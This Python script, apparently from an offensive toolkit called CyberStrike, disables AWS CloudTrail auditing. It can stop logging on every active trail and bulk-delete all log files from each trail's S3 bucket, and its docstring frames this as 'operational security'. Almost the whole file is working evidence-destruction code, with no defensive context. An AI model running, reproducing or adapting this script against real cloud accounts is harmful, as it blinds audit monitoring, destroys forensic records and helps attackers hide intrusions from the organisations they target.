#!/usr/bin/env python3
"""
cloudtrail_blind.py — AWS CloudTrail Log Manipulation

Checks CloudTrail logging status, stops trails, manipulates event selectors,
and deletes log files from S3 for operational security.

Part of CyberStrike offensive security platform.
"""

import argparse
import json
import os
import signal
import sys
import time
from datetime import datetime
from pathlib import Path

try:
    import boto3
    from botocore.exceptions import ClientError
except ImportError:
    print("ERROR: boto3 required. Install: pip3 install boto3", file=sys.stderr)
    sys.exit(1)

STATE_FILE = str(Path.home() / ".cyberstrike" / "awshook-state.json")


def get_session(args):
    kwargs = {}
    if args.profile:
        kwargs["profile_name"] = args.profile
    if args.region:
        kwargs["region_name"] = args.region
    return boto3.Session(**kwargs)


def load_state():
    try:
        with open(STATE_FILE, "r") as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {"created_resources": []}


def save_state(state):
    os.makedirs(os.path.dirname(STATE_FILE), exist_ok=True)
    with open(STATE_FILE, "w") as f:
        json.dump(state, f, indent=2, default=str)


class CloudTrailBlind:
    def __init__(self, args):
        self.args = args
        self.event_count = 0
        self.start_time = None
        self.running = True
        self.state = load_state()

    def signal_handler(self, signum, frame):
        self.running = False

    def print_banner(self):
        print("=" * 70)
        print("CyberStrike — AWS CloudTrail Manipulation")
        print("=" * 70)
        print(f"PID:       {os.getpid()}")
        print(f"Action:    {self.args.action}")
        print(f"Profile:   {self.args.profile or 'default'}")
        print(f"Region:    {self.args.region or 'default'}")
        print(f"Output:    {'JSON' if self.args.json_output else 'text'}")
        print(f"Started:   {datetime.now().isoformat()}")
        print("=" * 70)
        print()

    def emit(self, record):
        self.event_count += 1
        if self.args.json_output:
            print(json.dumps(record, default=str), flush=True)
        else:
            action = record.get("action", "info")
            status = record.get("status", "")
            detail = record.get("detail", "")
            print(f"[{action.upper():<14}] [{status.upper():<8}] {detail}", flush=True)

    def track_resource(self, resource_type, resource_id, **extra):
        entry = {"type": resource_type, "id": resource_id, "created_at": datetime.now().isoformat()}
        entry.update(extra)
        self.state["created_resources"].append(entry)
        save_state(self.state)

    def action_status(self, session):
        ct = session.client("cloudtrail")
        try:
            trails = ct.describe_trails().get("trailList", [])
            if not trails:
                self.emit({"action": "status", "status": "warning", "detail": "No CloudTrail trails found"})
                return

            for trail in trails:
                if not self.running:
                    break
                name = trail["Name"]
                arn = trail.get("TrailARN", "")
                try:
                    status = ct.get_trail_status(Name=name)
                    is_logging = status.get("IsLogging", False)
                    latest_delivery = status.get("LatestDeliveryTime")
                    latest_notification = status.get("LatestNotificationTime")

                    selectors = ct.get_event_selectors(TrailName=name)
                    event_selectors = selectors.get("EventSelectors", [])
                    advanced = selectors.get("AdvancedEventSelectors", [])

                    self.emit({
                        "action": "status",
                        "status": "logging" if is_logging else "STOPPED",
                        "detail": f"{name}: logging={'ON' if is_logging else 'OFF'} multi_region={trail.get('IsMultiRegionTrail', False)} bucket={trail.get('S3BucketName', 'N/A')}",
                        "trail_name": name,
                        "trail_arn": arn,
                        "is_logging": is_logging,
                        "is_multi_region": trail.get("IsMultiRegionTrail", False),
                        "s3_bucket": trail.get("S3BucketName"),
                        "s3_prefix": trail.get("S3KeyPrefix"),
                        "log_file_validation": trail.get("LogFileValidationEnabled", False),
                        "latest_delivery": latest_delivery,
                        "event_selectors": len(event_selectors),
                        "advanced_selectors": len(advanced),
                    })
                except ClientError as e:
                    self.emit({"action": "status", "status": "error", "detail": f"{name}: {e}"})
        except ClientError as e:
            self.emit({"action": "status", "status": "error", "detail": str(e)})

    def action_stop(self, session):
        ct = session.client("cloudtrail")
        try:
            trails = ct.describe_trails().get("trailList", [])
            for trail in trails:
                if not self.running:
                    break
                name = trail["Name"]
                try:
                    status = ct.get_trail_status(Name=name)
                    if not status.get("IsLogging", False):
                        self.emit({"action": "stop", "status": "skipped", "detail": f"{name} already stopped"})
                        continue

                    ct.stop_logging(Name=name)
                    self.track_resource("stopped_trail", name, was_logging=True)
                    self.emit({"action": "stop", "status": "success", "detail": f"Stopped logging on {name}"})
                except ClientError as e:
                    self.emit({"action": "stop", "status": "failed", "detail": f"{name}: {e}"})
        except ClientError as e:
            self.emit({"action": "stop", "status": "error", "detail": str(e)})

    def action_delete_logs(self, session):
        ct = session.client("cloudtrail")
        s3 = session.client("s3")
        try:
            trails = ct.describe_trails().get("trailList", [])
            for trail in trails:
                if not self.running:
                    break
                bucket = trail.get("S3BucketName")
                prefix = trail.get("S3KeyPrefix", "")
                if not bucket:
                    continue

                deleted = 0
                try:
                    paginator = s3.get_paginator("list_objects_v2")
                    pag_kwargs = {"Bucket": bucket}
                    if prefix:
                        pag_kwargs["Prefix"] = prefix

                    for page in paginator.paginate(**pag_kwargs):
                        if not self.running:
                            break
                        objects = page.get("Contents", [])
                        if not objects:
                            continue
                        delete_objs = [{"Key": obj["Key"]} for obj in objects]
                        s3.delete_objects(Bucket=bucket, Delete={"Objects": delete_objs, "Quiet": True})
                        deleted += len(delete_objs)

                    self.emit({
                        "action": "delete_logs",
                        "status": "success",
                        "detail": f"Deleted {deleted} log objects from s3://{bucket}/{prefix}",
                        "bucket": bucket,
                        "prefix": prefix,
                        "objects_deleted": deleted,
                    })
                except ClientError as e:
                    self.emit({"action": "delete_logs", "status": "failed", "detail": f"s3://{bucket}: {e}"})
        except ClientError as e:
            self.emit({"action": "delete_logs", "status": "error", "detail": str(e)})

    def run(self):
        self.print_banner()

        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

        self.start_time = time.monotonic()

        session = get_session(self.args)

        actions = {
            "status": self.action_status,
            "stop": self.action_stop,
            "delete_logs": self.action_delete_logs,
        }

        action_fn = actions.get(self.args.action)
        if not action_fn:
            print(f"ERROR: Unknown action '{self.args.action}'. Available: {', '.join(actions.keys())}", file=sys.stderr)
            sys.exit(1)

        action_fn(session)
        self.cleanup()

    def cleanup(self):
        print(f"\n--- cloudtrail_blind summary ---")
        print(f"Action: {self.args.action}")
        print(f"Records: {self.event_count}")
        if self.start_time:
            print(f"Duration: {time.monotonic() - self.start_time:.1f}s")
        print("Done.")


def main():
    parser = argparse.ArgumentParser(
        description="Check, stop, or delete AWS CloudTrail logs for operational security.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python3 cloudtrail_blind.py --action status\n"
            "  python3 cloudtrail_blind.py --action stop\n"
            "  python3 cloudtrail_blind.py --action delete_logs --json-output\n"
        ),
    )
    parser.add_argument("--action", type=str, required=True, help="Action: status|stop|delete_logs")
    parser.add_argument("--profile", type=str, default=None, help="AWS profile name")
    parser.add_argument("--region", type=str, default=None, help="AWS region")
    parser.add_argument("--json-output", action="store_true", default=False, help="Output as JSON lines")
    args = parser.parse_args()

    blinder = CloudTrailBlind(args)
    blinder.run()


if __name__ == "__main__":
    main()
